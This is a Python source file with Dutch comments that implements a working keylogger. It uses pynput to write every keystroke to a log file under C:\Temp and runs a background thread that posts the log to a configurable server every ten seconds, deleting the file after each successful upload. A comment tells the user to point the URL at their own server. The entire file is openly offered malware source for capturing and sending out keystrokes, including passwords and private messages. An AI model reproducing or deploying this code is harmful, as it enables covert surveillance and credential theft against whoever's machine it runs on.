from pynput import keyboard
import threading
import time
import os
import requests


class Keylogger:
    def __init__(self):
        # Pad naar logbestand
        self.log_file = "C:\\Temp\\keylogs.txt"
        # Zorg dat de map bestaat
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)

        # URL van je server (pas dit aan naar je eigen server)
        self.server_url = "http://127.0.0.1:5000/logs"

    def on_press(self, key):
        try:
            with open(self.log_file, 'a', encoding="utf-8") as f:
                f.write(f'{key.char}')
        except AttributeError:
            if key == key.space:
                with open(self.log_file, 'a', encoding="utf-8") as f:
                    f.write(' ')
            elif key == key.enter:
                with open(self.log_file, 'a', encoding="utf-8") as f:
                    f.write('\n')
            elif key in (key.backspace, key.shift, key.shift_r):
                # Geen logging voor backspace en beide shift-toetsen
                pass
            else:
                with open(self.log_file, 'a', encoding="utf-8") as f:
                    f.write(f' {key} ')

    def send_logs_to_server(self):
        """Stuurt de logs elke 10 seconden naar de server"""
        while True:
            time.sleep(10)
            if os.path.exists(self.log_file):
                try:
                    with open(self.log_file, 'r', encoding="utf-8") as file:
                        log_data = file.read()

                    response = requests.post(self.server_url, data={'keylogs': log_data})

                    if response.status_code == 200:
                        print("Logs succesvol naar server gestuurd.")
                        os.remove(self.log_file)  # Verwijder bestand na succes
                    else:
                        print(f"Fout bij verzenden, statuscode: {response.status_code}")

                except Exception as e:
                    print(f"Kon logs niet versturen: {e}")

    def start(self):
        """Start de keylogger"""
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


def main():
    keylogger = Keylogger()

    # Start thread voor verzenden van logs
    threading.Thread(target=keylogger.send_logs_to_server, daemon=True).start()

    # Start luisteren naar toetsen
    keylogger.start()


if __name__ == "__main__":
    main()
